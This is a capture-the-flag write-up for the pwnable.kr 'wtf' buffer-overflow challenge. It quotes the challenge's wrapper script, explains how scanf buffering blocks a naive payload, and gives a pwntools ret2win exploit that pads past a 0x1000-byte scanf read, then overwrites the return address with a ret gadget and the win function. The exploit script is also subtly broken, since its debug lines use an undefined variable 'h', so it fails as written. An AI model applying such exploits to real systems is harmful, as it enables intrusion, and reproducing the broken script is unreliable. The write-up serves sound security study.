writeups for some of the pwnable.kr challenges i solved. theres a branch opened for each pwn

this challenge is being piped through a python2 script into a a binary. this is the script: <br>
```py
#!/usr/bin/python2
import os, sys, time
import subprocess
from threading import Timer

TIME = 5

class MyTimer():
    timer=None
    def __init__(self):
        self.timer = Timer(TIME, self.dispatch, args=[])
        self.timer.start()
    def dispatch(self):
        print 'program is not responding... something must be wrong :('
        os._exit(0)

def pwn( payload ):
    p = subprocess.Popen('./wtf', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    p.stdin.write( payload )
    output = p.stdout.readline()
    return output

if __name__ == '__main__':
    print '''
    ---------------------------------------------------
    -              Shall we play a game?              -
    ---------------------------------------------------
    
    Hey~, I'm a newb in this pwn(?) thing...
    I'm stuck with a very easy bof task called 'wtf'
    I think this is quite easy task, however my
    exploit payload is not working... I don't know why :(
    I want you to help me out here.
    please check out the binary and give me payload
    let me try to pwn this with yours.

                                - Sincerely yours, newb
    '''
    sys.stdout.flush()
    time.sleep(1)

    try:
        sys.stdout.write('payload please : ')
        sys.stdout.flush()      
        payload = raw_input()
        payload = payload.decode('hex')
        print 'thanks! let me try if your payload works...{0}'.format(payload)
        sys.stdout.flush()
        time.sleep(1)
        MyTimer()
        result = pwn( payload )
        if len(result) == 0:
            print 'your payload sucks! :('
            print 'I thought you were expert... what a shame :P'
            sys.stdout.flush()
            os._exit(0)

        print 'hey! your payload got me this : {0}\n'.format(result)
        print 'I admit, you are indeed an expert :)'
        sys.stdout.flush()
    except:
        print 'please give your payload in hex encoded format..'
        sys.stdout.flush()
        os._exit(0)

    sys.stdout.flush()
    os._exit(0)
```
it basically pipes a payload into a binary called wtf using python's subprocess lib pipe as input `p = subprocess.Popen('./wtf', stdin=subprocess.PIPE, stdout=subprocess.PIPE)` <br>
lets have a look into the binary


<img width="714" height="290" alt="image" src="https://github.com/user-attachments/assets/57dc0be2-9baa-4846-99df-7f7aa6b76559" />
<img width="424" height="309" alt="image" src="https://github.com/user-attachments/assets/4d7e2115-6923-4736-a56f-b43b6867e230" />
it called scanf with %d that takes an integer. checks if with a signed jump condition (jle) and calls a cumstom fgets implemntation on a 44 byte stack buffer with this signed int. the my fgets implemntation is just calling read() byte by byte of the shellcode with src as the buffer and stdin as input. on paper its just an easy ret2win with a ret gadget (PIE disbaled so win() addres stays constant). however this would simply not work because of the scanf internals. because the script that runs the program does `stdin.write(payload)` it sends the entire payload together into scanf and it takes it all. to surpass that scnaf and get into the "fgets" we need to completely fill the internal read() scanf calls. it usually is a size of a page, which is also usually 0x1000 bytes.

```py
from pwn import *
import sys
context.log_level = "error"
elf = ELF("./wtf", checksec=False)
rop = ROP(elf)

ret = rop.find_gadget(["ret"])[0]
win = elf.sym["win"]


payload  = b"-1 "
payload += b"B" * 4093 # fill the scanf
payload += b"A" * 56 # ret2win
payload += p64(ret)
payload += p64(win)
payload += b"\n"

hexpayload = payload.hex()
# sterr debugging so it wont interfere with the payload
print("payload bytes:", len(payload), file=sys.stderr)
print("hex chars:", len(h), file=sys.stderr)
print("hex even:", len(h) % 2 == 0, file=sys.stderr)
print("last 20:", h[-20:], file=sys.stderr)

sys.stdout.write(hexpayload + "\n")
```


